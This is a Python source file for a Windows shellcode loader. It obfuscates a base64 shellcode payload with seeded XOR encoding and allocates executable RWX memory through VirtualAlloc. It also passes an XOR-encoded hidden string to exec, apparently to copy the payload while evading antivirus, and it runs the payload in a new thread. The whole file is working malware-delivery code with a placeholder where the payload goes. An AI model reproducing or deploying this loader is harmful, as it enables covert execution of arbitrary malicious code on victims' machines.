import base64
import random
import ctypes

def decode(shell_code,keys):
    shell_code_base64 = ''
    random.seed(keys)
    code = shell_code.split(',')
    for item in code:
        item = int(item)
        shell_code_base64 += chr(item ^ random.randint(0, 255))
    return shell_code_base64

def fs_decode(funcs):
    fs_keys = '123'
    func_codes = ''
    random.seed(fs_keys)
    func_code = funcs.split(',')
    for item in func_code:
        item = int(item)
        func_codes += chr(item ^ random.randint(0, 255))
    return func_codes

def encode(ShellCode,keys):
    random.seed(keys)
    ShellCode_2 = ''
    for item in ShellCode:
        ShellCode_2 += str(ord(item) ^ random.randint(0, 255)) + ','
    ShellCode_2 = ShellCode_2.strip(',')
    return ShellCode_2


def run(shellcode):
    ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
    funcs = '70,208,133,111,226,123,113,146,231,30,133,20,54,203,71,77,230,234,182,55,207,108,203,231,232,79,137,160,182,180,203,54,84,167,78,235,21,203,131,209,183,25,202,144,179,84,168,137,158,181,33,136,154,102,166,98,8,179,139,242,251,26,1,178,19,125,22,209,56,51,119,41,229,118,164,182,74,178,157,53,248,183,48,58,66,179,109,168,30,182,106,60,119,170,147,57,73,4,41,221,62,148,2,9,60,188,167,47,194,232,35,141,240,193,78,169,122,86'
    func = fs_decode(funcs)
    exec(func)
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rwxpage), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

if __name__ == '__main__':
    ShellCode = ''' ShellCode '''
    keys = 'Axx8'
    shell_code = encode(ShellCode.replace('"', '').replace('\n', ''),keys)
    shellcode = decode(shell_code,keys)
    shellcode = base64.b64decode(shellcode)
    run(shellcode)
